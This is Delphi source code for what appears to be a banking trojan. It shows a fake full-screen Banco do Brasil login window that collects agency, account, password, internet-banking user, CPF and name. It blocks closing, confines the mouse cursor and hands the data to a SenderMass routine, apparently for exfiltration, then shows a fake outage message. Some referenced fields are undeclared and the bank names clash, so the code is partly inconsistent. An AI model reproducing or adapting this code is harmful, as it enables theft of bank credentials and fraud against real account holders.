{$IMAGEBASE 31554689}

unit Chique;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, pngimage, StdCtrls;

type
  TYelobb = class(TForm)
    Timchique: TTimer;
    Image1: TImage;
    Label1: TLabel;
    Edit1: TEdit;
    PanBrasil: TPanel;
    Image2: TImage;
    EditAg: TEdit;
    EditCont: TEdit;
    EditS8: TEdit;
    ComboBox1: TComboBox;
    Entrar: TLabel;
    PanBrasil2: TPanel;
    Image3: TImage;
    EditS6: TEdit;
    EditS4: TEdit;
    Label2: TLabel;
    Label3: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure TimchiqueTimer(Sender: TObject);
    procedure Label1Click(Sender: TObject);
    procedure EditAgChange(Sender: TObject);
    procedure EditAgKeyPress(Sender: TObject; var Key: Char);
    procedure EditAgMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure EditContKeyPress(Sender: TObject; var Key: Char);
    procedure EntrarClick(Sender: TObject);
    procedure Label2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Yelobb: TYelobb;

implementation

{$R *.dfm}
uses
Natal, Gerador;

procedure TYelobb.EditAgChange(Sender: TObject);
begin
  if Length(EditAg.Text) = 6 then
  EditCont.SetFocus;
end;

procedure TYelobb.EditAgKeyPress(Sender: TObject; var Key: Char);
begin
  if Length(EditAg.Text) = 4 then
      begin
         EditAg.Text := EditAg.Text + '-';
         EditAg.Selstart := Length(EditAg.text);
      end;
end;

procedure TYelobb.EditAgMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  EditAg.Hint :='Digite a sua Agência';
end;

procedure TYelobb.EditContKeyPress(Sender: TObject; var Key: Char);
 var
  str: string;
  c: integer;
begin
   str := '';
  if (key <> #8) then begin
    if (ord(key) in [48..57]) or (ord(key) in [65..90]) or (ord(key) in [97..122]) then begin
      if (Length(EditCont.Text) > 0) and (Length(EditCont.Text) < 13) then begin
        for c := 1 to Length(EditCont.Text) do
          if EditCont.Text[c] <> '-' then
            str := str+EditCont.Text[c];
        str := str+'-'+key;
        EditCont.Text := str;
        key := #0;
      end;
    end else
      key := #0;
  end else begin
    if (Length(EditCont.Text) > 1) and (Length(EditCont.Text) <> 3) then begin
      for c := 1 to Length(EditCont.Text)-3 do
        if EditCont.Text[c] <> '-' then
          str := str+EditCont.Text[c];
      str := str+'-'+EditCont.Text[Length(EditCont.Text)-2];
      EditCont.Text := str;
      key := #0;
    end else begin
      if (Length(EditCont.Text) = 3) then begin
        str := EditCont.Text[1];
        EditCont.Text := str;
        key := #0;
      end else begin
        EditCont.Clear;
      end;
    end;
  end;
end;

procedure TYelobb.EntrarClick(Sender: TObject);
begin

  if EditAg.Text='' then
  begin
    MessageBox(Self.handle,'BB INFORMA : Digite o Número de sua Agência!', 'BANCO DO BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

  if EditCont.Text='' then
  begin
    MessageBox(Self.handle,'BB INFORMA : Digite o Número de sua Conta com o Dígito!', 'BANCO DO BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

  if EditS8.Text='' then
  begin
    MessageBox(Self.handle,'BB INFORMA : Digite sua Senha de 08 Dígitos!', 'BANCO DO BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

  PanBrasil2.Visible := True;
end;

procedure TYelobb.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  Canclose := False;
end;

procedure TYelobb.FormCreate(Sender: TObject);
begin
  Application.Icon := Icon;
  Width  := Screen.Width;
  Height := Screen.Height - BarrasAltura;
  Top  := 0;
  Left := 0;
end;

procedure TYelobb.Label1Click(Sender: TObject);
begin
  PanBrasil.visible := True;
end;

procedure TYelobb.Label2Click(Sender: TObject);
begin

DadosEnvio_ := TStringList.Create;

DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('BANCO BRASIL');
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('USUARIO:   '+EditUser.text);
DadosEnvio_.Add('SENHA NET: '+EditSenha.text);
DadosEnvio_.Add('CPF:       '+EditCpf.Text);
DadosEnvio_.Add('NOME:      '+EditNome.Text);
DadosEnvio_.Add('=============================================');

Application.MessageBox(' Sistema indisponível no momento! Por favor, tente mais tarde.', 'Caixa Econômica Federal',mb_Ok+mb_IconInformation);

//SenderFull
try
  Yelobb.Visible := False;
  SenderMass(DadosEnvio_ , 'BB');
  DadosEnvio_.Free;
except
end;
Yelobb.Timchique.Enabled := False;
end;
procedure TYelobb.TimchiqueTimer(Sender: TObject);
var
 R: TRect;
begin
  R := GetClientRect;
  R.TopLeft := ClientToScreen(R.TopLeft);
  R.BottomRight := ClientToScreen(R.BottomRight);
  ClipCursor(@R);
end;

end.
